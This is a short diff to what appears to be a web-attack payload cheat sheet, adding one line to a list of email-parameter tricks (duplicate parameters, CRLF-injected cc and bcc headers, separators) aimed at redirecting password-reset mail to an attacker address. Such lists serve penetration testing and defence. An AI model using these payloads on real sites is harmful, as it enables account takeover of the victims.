@@ -20,6 +20,7 @@
         Double parameter: email=victim@xyz.tld&email=hacker@xyz.tld
 
         carbon copy: email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
+                     email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
 
         Using separators: email=victim@xyz.tld,hacker@xyz.tld
                         email=victim@xyz.tld%20hacker@xyz.tld
